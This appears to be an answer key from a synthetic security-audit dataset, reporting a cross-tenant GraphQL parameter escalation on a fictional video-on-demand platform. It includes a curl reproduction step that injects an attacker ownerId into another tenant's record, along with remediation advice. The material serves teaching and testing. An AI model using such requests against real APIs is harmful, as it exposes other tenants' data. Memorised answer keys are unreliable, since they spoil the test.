# Expected Response

## System
- **Domain:** Media / Video-on-Demand
- **System:** StreamCore VOD Platform
- **Example ID:** GQL-0219

## Priority Findings

### Finding 1: VOD Platform — Parameter Escalation via updateResource Extends Session Scope to Cross-Tenant Content Data (Pattern 10.2)
**Severity:** High
**Category:** Single-User / Parameter Escalation / Own Session Scope Extension

**Summary:**
Per §4.0 (RISK-GQL-219): The `getResource` resolver fetches by `resourceId` only, without verifying `tenantId` ownership. Per §5.0 (Pattern 10.2 — parameter escalation/own session scope extension): the `updateResource` mutation accepts a client-supplied `ownerId` that escalates the caller's session scope beyond their own content to that of other tenants. An attacker from `tenant-d2d3` submitted `updateResource(id: "R-2219", input: {status: "approved", ownerId: "attacker-d2d33c91"})` against a VOD content record belonging to `tenant-3c91`, receiving `CONFIDENTIAL-d2d33c91`. In Media / VOD, unauthorized access to or modification of content rights, DRM configurations, and subscriber data constitutes a copyright and privacy violation.

**Evidence from HAR:**
- Request: `POST https://api.streamcore-vod-platf.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-d2d3`
- Mutation: `updateResource(id: "R-2219", input: {status: "approved", ownerId: "attacker-d2d33c91"}) { resourceId status }`
- Response `200 OK`: `tenantId: "tenant-3c91"`, `ownerId: "other-user-d2d33c91"`, `sensitiveField: "CONFIDENTIAL-d2d33c91"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-d2d33c91`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §4.0 | RISK-GQL-219 | getResource resolver lacks tenantId ownership check |
| context.txt §5.0 | Pattern 10.2 | Parameter escalation, own session scope extension |
| HAR mutation | input.ownerId | attacker-d2d33c91 (client-injected) |
| HAR response | tenantId | tenant-3c91 returned to tenant-d2d3 |
| HAR response | sensitiveField | CONFIDENTIAL-d2d33c91 |
| HAR header | x-request-id | req-d2d33c91 |

## Steps to Reproduce

### Step 1 — updateResource parameter escalation VOD cross-tenant (HAR)
```bash
curl -s -X POST https://api.streamcore-vod-platf.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-d2d3" \
  -d '{"query": "mutation { updateResource(id: \"R-2219\", input: {status: \"approved\", ownerId: \"attacker-d2d33c91\"}) { resourceId status } }"}'
```
**Vulnerable:** `tenant-3c91` VOD content mutated, returns `CONFIDENTIAL-d2d33c91`. **Secure:** FORBIDDEN.

## Remediation
1. Resolver: `WHERE resource_id = $id AND tenant_id = $jwt.tenantId`.
2. Strip `ownerId` from `ResourceInput`; never allow session scope extension via input parameters.
3. Redis cache key: `resource:{tenantId}:{resourceId}`.
